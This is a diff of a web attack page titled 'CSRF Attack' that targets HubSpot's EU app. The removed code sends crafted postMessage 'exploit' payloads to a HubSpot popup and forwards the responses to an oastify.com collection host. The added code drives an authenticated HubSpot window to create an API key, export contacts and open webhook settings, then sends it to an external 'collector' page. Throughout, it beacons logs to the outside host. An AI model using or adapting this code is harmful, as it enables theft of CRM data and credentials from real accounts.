@@ -2,144 +2,68 @@
 <html>
 <head><title>Relay</title></head>
 <body>
-<h1>Relay</h1>
+<h1>CSRF Attack</h1>
 <div id="status"></div>
 <script>
-const EXFIL = 'https://l6s5jp6udf0bc26os0vl0scprgx7l19q.oastify.com';
+const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
 
 function log(msg) {
     document.getElementById('status').innerHTML += '<br>' + msg;
     new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
 }
 
-// Listen for logs FROM the sandbox iframe
 window.addEventListener('message', function(e) {
-    // Check if it's a log message from our sandbox
-    if (e.data && e.data.sandboxLog) {
-        log('SANDBOX: ' + e.data.sandboxLog);
-    }
-    
-    // Check if it's a response from HubSpot (relayed through sandbox)
-    if (e.data && e.data.hubspotResponse) {
-        log('HUBSPOT_RESPONSE: ' + e.data.hubspotResponse.substring(0, 200));
-        
-        // Full exfiltration
-        fetch(EXFIL + '/response', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: e.data.hubspotResponse
-        });
-    }
-    
     if (e.data && e.data.action === 'startExploit') {
         log('TRIGGERED');
         
         const blob = new Blob([`
 <html>
 <body>
-<h2>Popup Exploitation</h2>
-<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
+<h2>CSRF Execution</h2>
+<div id="log"></div>
 <script>
+const E = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
+
 function l(m) { 
     document.getElementById('log').innerHTML += '<br>' + m;
-    // Send logs to parent via postMessage
-    window.parent.postMessage({sandboxLog: m}, '*');
+    // Can't exfil from blob, so just log
 }
 
-l('START_origin=' + window.origin);
-l('opening_hubspot');
+l('START');
 
-let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
+// Open authenticated HubSpot window
+let hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
 
-if (!hub) {
-    l('ERROR_blocked');
-} else {
-    l('popup_opened');
+if (hub) {
+    l('opened');
     
-    let attempts = 0;
-    let checker = setInterval(() => {
-        attempts++;
+    setTimeout(() => {
+        // Try different CSRF attacks in sequence
         
-        try {
-            hub.origin;
-            if (attempts % 20 === 0) l('waiting_' + attempts);
-        } catch(e) {
-            clearInterval(checker);
-            l('hubspot_loaded_after_' + attempts);
-            
-            // Listen for responses from HubSpot
-            window.addEventListener('message', function(resp) {
-                if (resp.source === hub) {
-                    l('GOT_RESPONSE_origin=' + resp.origin);
-                    l('response_type=' + (resp.data.type || 'unknown'));
-                    
-                    // Send to parent
-                    const respStr = JSON.stringify(resp.data);
-                    window.parent.postMessage({
-                        hubspotResponse: respStr
-                    }, '*');
-                }
-            });
-            
-            // Send exploits
-            setTimeout(() => {
-                l('sending_exploit_1');
-                
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                    commandId: 'getdata',
-                    featureId: 'crm',
-                    parameters: {portalId: '46962361'},
-                    resultCount: 100,
-                    language: 'en',
-                    objectId: '46962361',
-                    applicationId: 'crm',
-                    basePath: '/crm',
-                    maxPollingAttempts: 5,
-                    pollingInterval: 200
-                }, '*');
-            }, 1000);
+        // Attack 1: Try to create an API key
+        l('attempt_1_create_api_key');
+        hub.location = 'https://app-eu1.hubspot.com/integrations-settings/146256700/installed/private-apps/new';
+        
+        setTimeout(() => {
+            // Attack 2: Export contacts
+            l('attempt_2_export_contacts');
+            hub.location = 'https://app-eu1.hubspot.com/contacts/146256700/objects/0-1/views/all/list?export=true';
             
             setTimeout(() => {
-                l('sending_exploit_2');
+                // Attack 3: Navigate to webhook creation
+                l('attempt_3_webhooks');
+                hub.location = 'https://app-eu1.hubspot.com/webhooks-dashboard/146256700';
                 
-                hub.postMessage({
-                    type: 'raw',
-                    _callbackId: 'exploit_' + Date.now(),
-                    body: {
-                        action: 'getData',
-                        portalId: '46962361'
-                    }
-                }, '*');
-            }, 2000);
-            
-            setTimeout(() => {
-                l('sending_exploit_3');
+                setTimeout(() => {
+                    // Final: Navigate to our collector
+                    l('navigating_to_collector');
+                    hub.location = 'https://majdch22.github.io/collector.html';
+                }, 3000);
                 
-                hub.postMessage({
-                    type: 'TOGGLE_DARK_MODE',
-                    isDarkMode: true
-                }, '*');
             }, 3000);
-            
-            setTimeout(() => {
-                l('sending_exploit_4');
-                
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_FEEDBACK',
-                    feedbackAnnotatedCompletions: {
-                        portalId: '46962361',
-                        getData: true
-                    }
-                }, '*');
-            }, 4000);
-        }
+        }, 3000);
         
-        if (attempts > 100) {
-            clearInterval(checker);
-            l('timeout');
-        }
-    }, 100);
+    }, 2000);
 }
 <\/script>
 </body>
